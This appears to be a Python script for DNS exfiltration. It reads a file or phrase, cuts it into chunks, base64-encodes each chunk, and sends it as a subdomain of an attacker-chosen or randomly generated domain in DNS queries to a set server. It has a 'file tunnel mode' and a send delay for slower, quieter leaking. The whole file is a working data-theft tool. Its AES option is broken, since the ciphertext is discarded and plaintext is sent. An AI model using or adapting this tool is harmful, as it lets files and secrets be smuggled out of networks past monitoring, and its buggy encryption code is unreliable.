#!/usr/bin/python3
import base64, sys, argparse
from Crypto.Cipher import AES #aes 128
import random
import sendUDP
import time

##Requires: 
#sudo apt install python3-pip
#sudo pip3 install pycryptodome

dnsServer = "192.168.1.1"
dnsPort = 53
aesEncrypt = False
fileMode = False
autoDomain = False
sampleRequest = "Super secret data"
fireRateDelay =  0

def requestFormer(data):
    
    if autoDomain == True:
        global domain
        domain = ""
        for x in range(0, random.randint(5,10)):
            domain += chr(random.randint(97, 122)) #just to get randomness, not a secret key or anything - random int of ascii range to char of between 5 and 10 chars

        domain += ".com" 

    time.sleep(fireRateDelay)

    print("Domain to tag: " + domain)
    print("DNS Server: " + dnsServer + ":" + str(dnsPort))

    if fileMode == True:
        print("File Fragmented: " + filename)
    else:
        print("Original Query Data: " + sampleRequest)

    if aesEncrypt == True:
        aesIV = ".E]`A]ys@q.aa!YU"
        
        print("AES Key: " + aesKey)
        print("AES IV: " + aesIV)


        # Docs & library - https://pycryptodome.readthedocs.io/en/latest/src/examples.html
        #                   https://github.com/Legrandin/pycryptodome/issues/259

        encryptor = AES.new(bytes(aesKey, "utf-8"), AES.MODE_CBC, IV= bytes(aesIV, "utf-8"))

        #----------------------------------------------------------------------------------------------
        #https://stackoverflow.com/questions/13673060/split-string-into-strings-by-length
        lineLen=16
        linePart=[data[y-lineLen:y] for y in range(lineLen, len(data)+lineLen,lineLen)]
        #----------------------------------------------------------------------------------------------
        for part in linePart:

            while len(part) != 16:
                part = part + "="

            covertSubDomain = str(encryptor.encrypt(bytes(part, "utf-8")))

            print("Before Encryption: " + data + '     ' + "After Encryption: " + covertSubDomain)


            base64Data = base64.b64encode(bytes(data, 'utf-8'))
            covertSubDomain = base64Data.decode("utf-8")


            url = (covertSubDomain + "." + domain)

            print("Provided: " + data + '     ' + "Encoded URL: " + url)

            try:
                message = sendUDP.build_message("A", url) 
                response = sendUDP.send_udp_message(message, dnsServer, dnsPort)
                print("Sent DNS exfiltrated portion!\n")
            except:
                print("An error occured\n")
    else:
        base64Data = base64.b64encode(bytes(data, 'utf-8'))
        covertSubDomain = base64Data.decode("utf-8")

        url = (covertSubDomain + "." + domain)

        print("Provided: " + data + '     ' + "Encoded URL: " + url)


        try:
            message = sendUDP.build_message("A", url) 
            response = sendUDP.send_udp_message(message, dnsServer, dnsPort)
            print("Sent DNS exfiltrated portion!\n")

        except:
            print("An error occured\n")

#put dupe stuff in own function!!!! <3

def filePrep(filename):
    f = open(filename, "rb")

    for line in f:
    #----------------------------------------------------------------------------------------------
    #https://stackoverflow.com/questions/13673060/split-string-into-strings-by-length

        lineLen=10
        linePart=[line[y-lineLen:y] for y in range(lineLen, len(line)+lineLen,lineLen)]
    #----------------------------------------------------------------------------------------------
        for part in linePart:
            requestFormer(str(part))

    f.close()

#https://docs.python.org/3/howto/argparse.html

if __name__ == "__main__":
    print("TRANSMISSION MAY HALT FOR A SECOND OR SO OCCASIONALLY, BE PATIENT!" + "\n")

    switchCheck = argparse.ArgumentParser()
    switchCheck.add_argument("-d", "--domain", help="Domain required to append malformed subdomain to") 
    switchCheck.add_argument("-f", "--filename", help="Optional - Instead of a static phrase, a file can be segmented and pushed")
    switchCheck.add_argument("-a", "--aesencrypt", help="Apply AES encryption before base64, specifying a 16 bit key") 
    switchCheck.add_argument("-t", "--senddelay", help="Slow rate of fire of UDP messages (seconds)") 
    args = switchCheck.parse_args()

    if len(sys.argv) == 1:
        switchCheck.print_help()
        sys.exit()

    if str(args.domain) == "None":
        autoDomain = True
    else:
        global domain
        domain = args.domain

    if args.aesencrypt:
        print("AES ENCRYPTION ENABLED - AUTOMATIC PADDING FOR NON 16 BIT STRINGS" + "\n")
        aesEncrypt = True
        global aesKey
        aesKey = args.aesencrypt

    if args.senddelay:
        fireRateDelay = int(args.senddelay)
        print("SLOW FIRE MODE ENABLED - PLEASE WAIT FOR THE DEFINED TIME TO ELAPSE" + "\n")

    if args.filename:
        print("FILE TUNNEL MODE ENABLED - THE FILE WILL BE TRANSMITTED VIA DNS REQUESTS" + "\n")
        fileMode = True

        global filename
        filename = args.filename

        filePrep(filename)
    else:
        requestFormer(sampleRequest)
    
#aes after, choice of base64 and aes256??
#play with lengths for efficiency, splitting base64 and aes strings too!
